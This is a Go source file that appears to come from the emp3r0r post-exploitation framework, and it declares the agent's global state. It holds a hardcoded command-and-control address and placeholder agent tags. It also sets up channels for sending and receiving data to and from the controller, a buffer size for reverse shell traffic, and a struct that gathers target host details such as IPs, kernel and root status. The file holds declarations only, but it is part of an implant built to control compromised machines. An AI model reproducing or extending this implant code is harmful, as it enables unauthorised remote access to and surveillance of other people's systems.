package agent

import (
	"os"

	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

var (
	// AgentRoot root directory of emp3r0r
	AgentRoot, _ = os.Getwd()

	// HTTPClient handles agent's http communication
	HTTPClient = tun.EmpHTTPClient()

	// H2Json the connection to CC, for JSON message-based communication
	H2Json *h2conn.Conn

	// H2Stream used for buffered constant stream
	H2Stream H2Conn

	// RecvCC used for receiving data from CC
	RecvCC = make(chan []byte)

	// SendCC used for sending data to CC
	SendCC = make(chan []byte)

	// KernelVersion get linux version
	KernelVersion = GetKernelVersion()
)

const (
	// CCAddress how our agent finds its CC
	CCAddress = "https://10.103.249.16:8000/"

	// CCIndicator check this before trying connection
	CCIndicator = "[cc_indicator]"

	// Tag uuid of this agent
	Tag = "[agent_uuid]"

	// OpSep separator of CC payload
	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"

	// BufSize buffer size for reverse shell communication
	BufSize = 1
)

// SystemInfo agent properties
type SystemInfo struct {
	Tag     string   // identifier of the agent
	CPU     string   // CPU info
	Mem     string   // memory size
	OS      string   // OS name and version
	Kernel  string   // kernel release
	Arch    string   // kernel architecture
	IP      string   // public IP of the target
	IPs     []string // IPs that are found on target's NICs
	HasRoot bool     // is agent run as root?
}

// TunData data to send in the tunnel
type TunData struct {
	Payload string `json:"payload"` // payload
	Tag     string `json:"tag"`     // tag of the agent
}

// H2Conn add `IsClosed` to h2conn.Conn
type H2Conn struct {
	Conn     *h2conn.Conn
	IsClosed bool
}
